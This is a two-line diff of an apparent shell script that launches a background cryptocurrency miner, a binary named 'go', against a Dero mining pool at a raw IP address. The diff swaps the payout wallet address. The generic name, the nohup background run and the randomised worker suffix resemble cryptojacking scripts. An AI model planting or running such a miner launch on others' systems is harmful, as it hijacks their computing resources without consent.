@@ -1,2 +1,2 @@
 chmod 700 go 
-nohup ./go -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xck2qackrzvwlhsfdq94v.$RANDOM -r 15.235.164.162:4300 -p stratum &
+nohup ./go -w dero1qyxvnqz5azaqdsgcukqdrn8malru9phwprl3pxdc3n83tak2q4upvqqf35rj0.$RANDOM -r 15.235.164.162:4300 -p stratum &
